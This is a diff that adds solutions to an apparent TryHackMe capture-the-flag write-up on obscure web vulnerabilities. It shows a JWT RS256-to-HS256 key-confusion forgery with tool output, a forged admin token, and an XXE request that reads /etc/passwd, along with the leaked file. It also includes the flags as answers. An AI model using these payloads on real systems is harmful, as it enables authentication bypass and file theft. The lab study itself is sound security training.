@@ -326,9 +326,44 @@ Generated JWT tokens will also expire after a certain amount of time, so if you 
 
 Note: some recommended reading [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
 
+* https://github.com/Sjord/jwtdemo
+* https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
+* https://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php
+* http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/
+
+```
+kali@kali:~/CTFs/tryhackme/ZTH Obscure Web Vulns$ sudo /opt/TokenBreaker/RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA1NjEyNzMzLCJleHAiOjE2MDU2MTI4NTMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.iuAsaEsjF04s6mUv4IA5BZq634fX7-GAC4Jrf-gXIsTRX_5z9oaVfP7ngkdMIc1WgIKKQKvWt8h_Nfw1XfnGXQFqFUGJcIkQvqWyVwn3ph3Hi-KPAzMxBGNDn2RMBL1mvMh6-Kkl5PL8h9jPXVQKzYIiErGmql9ZCbXI4m7sfjXeDDxlo-0AubPFeZ6dzL8SYPhgH7JOp7k33hTJplP2IBWZ3N8wJAktntjdF59fGgutSomI0CRLH2JG5LNAukuqgMg8Oc4ajpus4LcssMHMvUy4w13fw4ESjJuF5wCBxrqiwaQcvnQMXkBzpDGqIWukHeb4RvDhPQ-Otw6i265kqQ -p public.pem 
+ ___  ___   _     _         _  _ __  __   _   ___
+| _ \/ __| /_\   | |_ ___  | || |  \/  | /_\ / __|
+|   /\__ \/ _ \  |  _/ _ \ | __ | |\/| |/ _ \ (__
+|_|_\|___/_/ \_\  \__\___/ |_||_|_|  |_/_/ \_\___|
+
+[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
+[*] Decode Payload value: {"iss":"Paradox","iat":1605612733,"exp":1605612853,"data":{"pingu":"noots"}}
+[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
+[<] Modify Header? [y/N]: N
+[<] Enter Your Payload value: {"iss":"Paradox","iat":1605612733,"exp":1605612853,"data":{"pingu":"noots"}}
+[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA1NjEyNzMzLCJleHAiOjE2MDU2MTI4NTMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.eSveNHcSU_hw3EGEAyEIIBugqyRtR_R8375Q1lQ7RmU
+```
+
+```
+Good Job! stdClass Object
+(
+    [iss] => Paradox
+    [iat] => 1605612733
+    [exp] => 1605612853
+    [data] => stdClass Object
+        (
+            [pingu] => noots
+        )
+
+)
+nootnootisthebestflag is the flag
+```
+
 1. What is the flag?
 
-``
+`nootnootisthebestflag`
 
 ## Task 15 [Section 3.5 - JWT]: Intro
 
@@ -388,7 +423,14 @@ You know the drill, you're given a vulnerable application and there's a flag onc
 
 1. What is the flag?
 
-`No answer needed`
+`{"auth":1605611903270,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","role":"admin","iat":1605611903}`
+
+```
+ Hello, longz! You have logged in as admin!
+flag=supernootnoot
+```
+
+`supernootnoot`
 
 ## Task 19 [Section 4: XXE] - Intro
 
@@ -444,13 +486,74 @@ XXE can't really be automatically exploited, as you can't guarantee xml data wil
 
 This challenge will ask you some basic questions on the system, and the application is vulnerable to XXE. Good luck!
 
+```
+POST /process.php HTTP/1.1
+Host: 10.10.226.160
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.226.160/
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 207
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root><name>aa</name><tel>aa</tel><email>&xxe;</email><password>aa</password></root>
+```
+
+```
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 09:43:26 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1641
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Sorry, root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+para:x:1000:1000:para:/home/para:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+ is already registered!
+```
+
 1. How many users are on the system?
 
-``
+`31`
 
 2. What is the name of the user with a UID of 1000?
 
-``
+`para`
 
 ## Task 23 [Bonus Section] - JWT once again
 
